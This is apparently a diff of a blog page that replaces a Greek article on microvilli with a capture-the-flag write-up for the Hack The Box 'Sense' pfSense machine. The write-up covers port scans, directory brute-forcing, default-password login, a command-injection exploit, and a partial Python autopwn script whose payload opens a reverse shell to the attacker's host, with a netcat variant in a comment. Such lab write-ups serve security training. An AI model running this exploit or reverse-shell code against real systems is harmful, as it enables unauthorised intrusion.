@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Microvilli (available in greek only) - The Portal of Knowledge</title>
-  <meta property='og:title' content="Microvilli (available in greek only) - The Portal of Knowledge">
+  <title>Sense write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Sense write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="This article is available only in greek. Οι μικρολάχνες (microvilli, ενικός: microvillus) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών.">
-  <meta property="og:description" content="This article is available only in greek. Οι μικρολάχνες (microvilli, ενικός: microvillus) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών.">
-  <meta property="og:image" content="https://alamot.github.io/images/microvilli.jpg">
+  <meta name="description" content="Write-up for the Sense machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Sense του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Sense machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Sense του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/pfsense.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/microvilli/">
+<meta property="og:url" content="https://alamot.github.io/sense_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Microvilli (available in greek only) |  ",
+    "headline": "Sense write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2010-01-08T00:00:00JST",
-    "dateModified": "2010-01-08T00:00:00JST",
+    "datePublished": "2018-03-24T00:00:00JST",
+    "dateModified": "2018-03-24T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,10 +198,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#δομή-μικρολαχνών">Δομή μικρολαχνών</a></li>
-<li><a href="#μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</a></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a></li>
+</ul></li>
+<li><a href="#finding-credentials">Finding credentials</a></li>
+<li><a href="#getting-root">Getting root</a>
+<ul>
+<li><a href="#autopwn-script">Autopwn script</a></li>
+</ul></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -243,25 +249,30 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/microvilli.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Microvilli (available in greek only)</h1></header>
-            <header lang="el"><h1 class="title">Μικρολάχνες</h1></header>
+            <header lang="en"><h1 id="title" class="title">Sense write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Sense</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">08 Jan 2010</time>
-            <time lang="el" class="topmargin7">08 Ιαν 2010</time>
+            <time lang="en" class="topmargin7">24 Mar 2018</time>
+            <time lang="el" class="topmargin7">24 Μαρ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/biology'>
-                <span lang="en">Biology</span>
-                <span lang="el">Βιολογία</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/microvilli'>
-                <span lang="en">microvilli</span>
-                <span lang="el">μικρολάχνες</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
+                </a>
+            
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/bsd'>
+                <span lang="en">bsd</span>
+                <span lang="el">bsd</span>
                 </a>
             
          
@@ -271,10 +282,16 @@ if (language) {
             <header lang="el"><h2>Περιεχόμενα</h2></header>
             <div><nav id="TableOfContents">
 <ul>
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#δομή-μικρολαχνών">Δομή μικρολαχνών</a></li>
-<li><a href="#μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</a></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a></li>
+</ul></li>
+<li><a href="#finding-credentials">Finding credentials</a></li>
+<li><a href="#getting-root">Getting root</a>
+<ul>
+<li><a href="#autopwn-script">Autopwn script</a></li>
+</ul></li>
 </ul>
 </nav></div>
           </section>
@@ -282,79 +299,246 @@ if (language) {
         
         
 
-<h1 id="εισαγωγή">Εισαγωγή</h1>
+<h1 id="enumeration">Enumeration</h1>
 
-<p>Οι <strong><em>μικρολάχνες</em></strong> (<em>microvilli</em>, ενικός: <em>microvillus</em>) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών όπως είναι:</p>
+<h2 id="port-scanning">Port scanning</h2>
 
-<ul>
-<li>η μεταφορά (απορρόφηση/έκκριση) ουσιών (π.χ. επιθηλιακά κύτταρα εντέρου, ηπατοκύτταρα, κύτταρα στο εγγύς εσπειραμένο σωληνάριο των νεφρών, επιθηλιακά κύτταρα επιδιδυμίδας)</li>
-<li>η υποδοχή ερεθισμάτων (π.χ. κύτταρα του οσφρητικού επιθήλιου, κύτταρα των γευστικών καλύκων, οι «στερεοβλεφαρίδες» στα τριχωτά κύτταρα του οργάνου του Corti στο αυτί)</li>
-<li>η κυτταρική προσκόλληση (π.χ. στην αναπαραγωγή η αγκυροβόληση σπερματοκύτταρων στα ωάρια γίνεται με τη συμβολή μικρολαχνών και των δύο κυττάρων, ενώ στην άμυνα οι μικρολάχνες της επιφάνειας των λευκοκυττάρων βοηθούν μεταξύ άλλων στη μετανάστευση τους)</li>
-</ul>
+<p>We scan the full range of TCP ports using masscan:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.60
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-22 09:51:28 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 443/tcp on 10.10.10.60                                    
+Discovered open port 80/tcp on 10.10.10.60</code></pre></div></div></p>
 
-<p>Φαίνεται ότι οι μικρολάχνες αν και γενικά διακρίνονται από σχετική ακαμψία έχουν την ικανότητα κάποιας περιορισμένης κίνησης και μάλιστα σε μερικά κύτταρα, όπως λ.χ. στα ηπατικά, έχουν τη δυνατότητα να αποσύρονται ή να εκτείνονται.</p>
+<p>We found TCP ports 80 and 443 open. Let&rsquo;s explore them using nmap:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80,443 10.10.10.60
 
-<p>Το μέγεθος των μικρολαχνών ποικίλει ανάλογα με τη λειτουργία τους, τον ιστό, το άτομο και το είδος. Γενικά έχουν μια διάμετρο της τάξης των 50-100 nm ενώ το μήκος τους κυμαίνεται από 100 nm έως πάνω από 2000 nm.</p>
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-22 11:54 EET
+Nmap scan report for 10.10.10.60
+Host is up (0.091s latency).
 
-<figure>
-<a title="By BallenaBlanca [CC BY-SA 4.0 (http://creativecommons.org/licenses/by-sa/4.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AVilli_%26_microvilli_of_small_intestine.svg" target="_blank"><img width="512" alt="Λάχνες και μικρολάχνες του λεπτού εντέρου" title="Λάχνες και μικρολάχνες του λεπτού εντέρου" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Villi_%26_microvilli_of_small_intestine.svg/512px-Villi_%26_microvilli_of_small_intestine.svg.png"/></a>
-<figcaption class="centered">Λάχνες και μικρολάχνες του λεπτού εντέρου</figcaption>
-</figure>
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+443/tcp open  ssl/http lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Login
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|specialized
+Running (JUST GUESSING): OpenBSD 4.X (93%), Comau embedded (92%), Linux 2.6.X (89%)
+OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/o:linux:linux_kernel:2.6.29
+Aggressive OS guesses: OpenBSD 4.0 (93%), Comau C4G robot control unit (92%), Linux 2.6.29 (89%), OpenBSD 4.3 (85%)
+No exact OS matches for host (test conditions non-ideal).</code></pre></div></div></p>
 
-<h1 id="δομή-μικρολαχνών">Δομή μικρολαχνών</h1>
+<h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-<p>Οι μικρολάχνες σε εγκάρσιες τομές έχουν περίπου σφαιρικό σχήμα, ενώ σε επιμήκεις τομές σχεδόν κυλινδρικό. Πρόκειται για μικροσκοπικές δακτυλιοειδείς δομές που καλύπτονται από πλασματική μεμβράνη που περικλείει κυτταρόπλασμα και μια πυκνή δέσμη 10-50 <strong><em>μικροϊνιδίων ακτίνης</em></strong>, τα οποία διασυνδέονται μέσω των πρωτεϊνών <em>φιμπρίνη</em> και <em>βιλλίνη</em> ή <em>φασίνη</em> για το σχηματισμό του <em>πυρήνα</em> (κέντρο) της μικρολάχνης. Αυτός ο δομικός πυρήνας ενώνεται με την κυτταρική μεμβράνη μέσω πλευρικών βραχιόνων που αποτελούνται από <em>μυοσίνη Ι</em> και <em>καλμοδούλινη</em> (πρωτεΐνη που δεσμεύει Ca<sup>2+</sup>). Στην πρόσδεση των ινιδίων ακτίνης με την πλασματική μεμβράνη παίζουν σημαντικό ρόλο και οι πρωτεΐνες της <strong>οικογένειας ERM</strong> (<em>Ezrin</em>, <em>Radixin</em>, <em>Moesin</em>). Το θετικό άκρο των μικροϊνιδίων ακτίνης συγκεντρώνεται στην κορυφή της μικρολάχνης όπου πιθανότατα καλύπτεται από άμορφες πρωτεΐνες καλύμματος που παρέχουν προστασία έναντι του αποπολυμερισμού, ενώ το αρνητικό άκρο προσδένεται στην «τερματική ζώνη».</p>
+<p>There are multiple vulnerabilities for PfSense but we need an authenticated user to exploit most of them. Maybe we can find some credentials if we search for notes in text files:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u https://10.10.10.60 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e txt
 
-<figure>
-<img class="bordered" src="/images/microvilli_structure.jpg" alt="Σχεδιάγραμμα της δομής των μικρολαχνών" title="Σχεδιάγραμμα της δομής των μικρολαχνών">
-<figcaption class="centered">Σχεδιάγραμμα της δομής των μικρολαχνών</figcaption>
-</figure>
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
 
-<p>Η <strong>τερματική ζώνη</strong> αποτελεί τη βάση των μικρολαχνών και αποτελείται από λεπτά οριζόντια ινίδια ακτίνης, συνδεδεμένα με ένα πολύπλοκο σύνολο από πρωτεΐνες που κατανέμονται:</p>
+Extensions: txt | Threads: 10 | Wordlist size: 441041
 
-<ul>
-<li>στις ρίζες των μικρολαχνών (<em>καλδεσμίνη</em>, <em>τροπομυοσίνη</em>, <em>βιλλίνη</em>)</li>
-<li>στις μεσόριζες (<em>μυοσίνη ΙΙ</em>, <em>TW260/240</em> ή <em>σπεκτρίνη</em>)</li>
-<li>στον περιφερειακό δακτύλιο (<em>τροπομυοσίνη</em>, <em>βινκουλίνη</em>, <em>α-ακτινίνη</em>).</li>
-</ul>
+Target: https://10.10.10.60
 
-<p>Κάτω από τα οριζόντια ινίδια ακτίνης, υπάρχει ένα οριζόντιο δίκτυο από <em>ενδιάμεσα ινίδια</em>. Διάχυτες στην περιοχή των μικρολαχνών, χωρίς να έχει εντοπιστεί ακόμα ειδική θέση τους, ανιχνεύονται οι πρωτεΐνες <em>πηκτωληματίνη</em>, <em>φιλαμίνη</em> και <em>καλπακτίνη</em>.</p>
+[09:42:09] Starting: 
+[09:42:45] 200 -  271B  - /changelog.txt
+[09:43:42] 200 -    7KB - /tree/
+[09:45:52] 302 -    0B  - /installer/  -&gt;  installer.php
+[10:51:23] 200 -  106B  - /system-users.txt</code></pre></div></div></p>
 
-<p>Στο κυτταρόπλασμα των μικρολαχνών γενικά δεν εντοπίζονται κυτταρικά οργανίδια. Η κυτταρική μεμβράνη που καλύπτει τη μικρολάχνη μπορεί να περιέχει πρωτεΐνες μεταφορείς, υποδοχείς, ένζυμα, γλυκοπρωτεΐνες κ.λπ. ανάλογα με τη λειτουργία που αυτή επιτελεί.</p>
+<h1 id="finding-credentials">Finding credentials</h1>
 
-<h1 id="μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</h1>
+<p>Let&rsquo;s see the contents of <a href="https://10.10.10.60/system-users.txt:" target="_blank">https://10.10.10.60/system-users.txt:</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">####Support ticket###
 
-<p>Πολυάριθμες ανομοιογενείς μικρολάχνες που ποικίλουν σε μήκος εκτείνονται από την <strong>βασεοπλευρική επιφάνεια</strong> (ενδοκρινή μοίρα) των ηπατοκυττάρων (παρεγχυματικά κύτταρα του ήπατος) μέσα στον <em>περικολποειδή χώρο του Disse</em> (<em>perisinusoidal Disse’s space</em>, <em>Spatium perisinusoideum</em>), αυξάνοντας έτσι σημαντικά την επιφάνεια ανταλλαγής ουσιών. Μεταξύ των βάσεων των μικρολαχνών βρίσκονται <em>επικαλυμμένα με κλαθρίνη βοθρία</em> (<em>clathrin-coated pits</em>), τα οποία συμμετέχουν στη διαδικασία της ενδοκύττωσης μέσω υποδοχέων. Επιτελείται απορρόφηση ουσιών από το αίμα (σάκχαρα, αμινοξέα, λιπίδια, χολερυθρίνη, χολικά άλατα, τοξικές ουσίες), ενώ εκκρίνονται ουσίες όπως π.χ. γλυκόζη ή πρωτεΐνες του πλάσματος (αλβουμίνη, ινωδογόνο, προθρομβίνη, παράγοντες πήξης V, VII και IX).</p>
+Please create the following user
 
-<figure>
-<img class="bordered" src="/images/hepatocyte_sinusoid.jpg" alt="Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse" title="Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse">
-<figcaption>Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse (SEM, μεγένθυνση x30.000).</figcaption>
-</figure>
+username: Rohit
+password: company defaults</code></pre></div></p>
 
-<p>Κοντές μικρολάχνες προβάλουν επίσης και από την <strong>κορυφαία επιφάνεια</strong> (εξωκρινή μοίρα) των ηπατοκυττάρων στους χοληφόρους σωληνίσκους (<em>bile canaliculi</em>, <em>canaliculi biliferi</em>). Πρόκειται για στενά κανάλια που σχηματίζονται μεταξύ γειτονικών ηπατοκυττάρων. Στον αυλό τους εκκρίνεται η χολή.</p>
+<p>Let&rsquo;s google-search the default password for PfSense:</p>
 
-<p lang="en" class="author">Antonios Tsolis</p>
-<p lang="el" class="author">Αντώνιος Τσώλης</p>
+<p><a href="https://doc.pfsense.org/index.php/What_is_the_default_username_and_password" target="_blank">https://doc.pfsense.org/index.php/What_is_the_default_username_and_password</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">The default credentials for a pfSense firewall are:
 
-<h1 id="βιβλιογραφία">Βιβλιογραφία</h1>
+Username: admin
+Password: pfsense</code></pre></div></p>
 
-<ul>
-<li>Λ.Χ. Μαργαρίτης, Β.Κ. Γαλανόπουλος, Κ.Ε. Κεραμάρης, Ε.Σ. Μαρίνος, Ι.Σ. Παπασιδέρη, Δ.Ι. Στραβοπόδης, Ι.Π. Τρουγκάκος (2008), «Βιολογία Κυττάρου», 4η έκδοση,  Ιατρικές εκδόσεις Λίτσας.</li>
-<li>Nedra F. Wilson and William J. Snel, (1998), «Microvilli and cell-cell fusion during fertilization», Trends in Cell Biology (Vol. 8) March 1998.</li>
-<li>Amieva MR, Wilgenbus KK, Furthmayr H. (1994), «Radixin is a component of hepatocyte microvilli in situ», Exp Cell Res.</li>
-<li>Berryman M, Franck Z, Bretscher A. (1993), «Ezrin is concentrated in the apical microvilli of a wide variety of epithelial cells whereas moesin is found primarily in endothelial cells», J Cell Sci.</li>
-</ul>
+<p><a href="https://doc.pfsense.org/index.php/Installing_pfSense#pfSense_Default_Configuration" target="_blank">https://doc.pfsense.org/index.php/Installing_pfSense#pfSense_Default_Configuration</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Default credentials are set to a username of admin with password pfsense</code></pre></div></p>
+
+<p>Therefore our credentials are rohit:pfsense.</p>
+
+<h1 id="getting-root">Getting root</h1>
+
+<p>Now, let&rsquo;s search for PfSense vulnerabilities:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit pfsense -w
+--------------------------------------------------------------------------------
+ Exploit Title
+--------------------------------------------------------------------------------
+pfSense - &#39;interfaces.php?if&#39; Cross-Site Scripting
+    https://www.exploit-db.com/exploits/35071/
+pfSense - &#39;pkg.php?xml&#39; Cross-Site Scripting
+    https://www.exploit-db.com/exploits/35069/
+pfSense - &#39;pkg_edit.php?id&#39; Cross-Site Scripting
+    https://www.exploit-db.com/exploits/35068/
+pfSense - &#39;status_graph.php?if&#39; Cross-Site Scripting
+    https://www.exploit-db.com/exploits/35070/
+pfSense - Authenticated Group Member Remote Command Execution (Metasploit)
+    https://www.exploit-db.com/exploits/43193/
+pfSense 2 Beta 4 - &#39;graph.php&#39; Multiple Cross-Site Scripting Vulnerabilities
+    https://www.exploit-db.com/exploits/34985/
+pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / RCE
+    https://www.exploit-db.com/exploits/23901/
+pfSense 2.1 build 20130911-1816 - Directory Traversal
+    https://www.exploit-db.com/exploits/31263/
+pfSense 2.2 - Multiple Vulnerabilities
+    https://www.exploit-db.com/exploits/36506/
+pfSense 2.2.5 - Directory Traversal
+    https://www.exploit-db.com/exploits/39038/
+pfSense 2.3.1_1 - Command Execution
+    https://www.exploit-db.com/exploits/43128/
+pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery
+    https://www.exploit-db.com/exploits/41501/
+pfSense Community Edition 2.2.6 - Multiple Vulnerabilities
+    https://www.exploit-db.com/exploits/39709/
+pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery
+    https://www.exploit-db.com/exploits/39306/
+pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery
+    https://www.exploit-db.com/exploits/39695/
+pfSense UTM Platform 2.0.1 - Cross-Site Scripting
+    https://www.exploit-db.com/exploits/24439/
+--------------------------------------------------------------------------------</code></pre></div></div></p>
+
+<p>Check also this link: <a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</a></p>
+
+<p>Let&rsquo;s see <a href="https://www.exploit-db.com/exploits/39709/:" target="_blank">https://www.exploit-db.com/exploits/39709/:</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">The status_rrd_graph_img.php page is vulnerable to command injection via the graph GET parameter. A non-administrative authenticated attacker having access privileges to the graph status functionality can inject arbitrary operating system commands and execute them in the context of the root user. Although input validation is performed on the graph parameter through a regular expression filter, the pipe character is not removed. Octal characters sequences can be used to encode a payload, bypass the filter for illegal characters, and create a PHP file to download and execute a malicious file (i.e. reverse shell) from a remote attacker controlled host.</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|command|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|printf%20OCTET_ENCODED_SHELLCODE|sh|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div></p>
+
+<p>Unfortunately, the exploit 39709 is badly written and very messy as it mixes HTML, Javascript, PHP and Python for no reason. So, I wrote my own exploitation script in Python.</p>
+
+<h2 id="autopwn-script">Autopwn script</h2>
+
+<p>Here is my script: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn_sense.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn_sense.py</a></p>
+
+<p>Don&rsquo;t forget to set LHOST appropriately.
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<span class="c1"># Author: Alamot (Antonios Tsolis)</span>
+
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib3</span>
+<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.10.60&#34;</span>
+<span class="n">RPORT</span><span class="o">=</span><span class="mi">443</span>
+<span class="n">LHOST</span><span class="o">=</span><span class="s2">&#34;10.10.15.128&#34;</span>
+<span class="n">LPORT</span><span class="o">=</span><span class="mi">60001</span>
+
+<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+
+<span class="k">def</span> <span class="nf">send_ptyshell_payload</span><span class="p">():</span>
+
+    <span class="c1"># This payload works too</span>
+    <span class="c1"># stager = &#34;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &#34; + str(LHOST) + &#34; &#34; + str(LPORT) + &#34; &gt; /tmp/f&#34;</span>
+
+    <span class="n">stager</span> <span class="o">=</span> <span class="s2">&#34;python -c </span><span class="se">\&#34;</span><span class="s2">import os, pty, socket; lhost = &#39;&#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;; lport = &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;); pty.spawn(&#39;/bin/sh&#39;); s.close(); exit()</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
+
+    <span class="n">encoded_stager</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">stager</span><span class="p">:</span>
+        <span class="n">encoded_stager</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\\\\</span><span class="si">%03d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))))</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">client</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+        <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="bp">False</span>
+
+        <span class="c1"># Retrieve the CSRF token first</span>
+        <span class="n">p1</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Connecting to get csrf token&#34;</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+        <span class="n">csrf</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;csrfMagicToken\s*=\s*&#34;(sid:\w+,\d+)&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;csrfMagicToken = &#34;</span> <span class="o">+</span> <span class="n">csrf</span><span class="p">)</span>
+
+        <span class="c1"># Login</span>
+        <span class="n">p2</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Logging in&#34;</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;__csrf_magic&#34;</span><span class="p">:</span><span class="n">csrf</span><span class="p">,</span> <span class="s2">&#34;usernamefld&#34;</span><span class="p">:</span><span class="s2">&#34;rohit&#34;</span><span class="p">,</span> <span class="s2">&#34;passwordfld&#34;</span><span class="p">:</span><span class="s2">&#34;pfsense&#34;</span><span class="p">,</span> <span class="s2">&#34;login&#34;</span><span class="p">:</span><span class="s2">&#34;Login&#34;</span><span class="p">}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
